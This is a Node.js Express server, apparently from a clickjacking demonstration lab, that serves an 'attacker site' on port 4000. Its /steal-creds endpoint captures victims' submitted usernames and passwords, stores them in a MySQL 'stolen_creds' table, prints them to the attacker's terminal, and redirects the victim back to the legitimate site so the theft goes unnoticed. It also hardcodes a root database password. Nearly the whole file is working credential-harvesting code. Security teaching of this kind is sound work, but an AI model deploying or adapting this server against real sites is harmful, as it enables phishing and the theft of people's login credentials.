const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const mysql = require('mysql2');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));

// MySQL connection (to store stolen credentials)
const db = mysql.createConnection({
  host: 'localhost',
  user: 'root',
  password: 'sql212002', 
  database: 'clickjacking_demo'
});

// Log stolen credentials to terminal
app.post('/steal-creds', (req, res) => {
  const { username, password } = req.body;
  
  // 1. Store in MySQL
  db.query(
    'INSERT INTO stolen_creds (username, password) VALUES (?, ?)',
    [username, password],
    (err) => {
      if (err) throw err;
      
      // 2. Print to attacker's terminal
      console.log(" STOLEN CREDENTIALS:");
      console.log(` Username: ${username}`);
      console.log(` Password: ${password}`);
      console.log("-----------------------");
      
      // 3. Redirect victim back to legit site
      res.redirect('http://localhost:3000');
    }
  );
});

// Serve clickjacking pages
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'views/index.html'));
});

app.get('/steal', (req, res) => {
  res.sendFile(path.join(__dirname, 'views/steal.html'));
});

app.listen(4000, () => {
  console.log('Attacker site running on http://localhost:4000');
  console.log('Waiting for credentials...\n');
});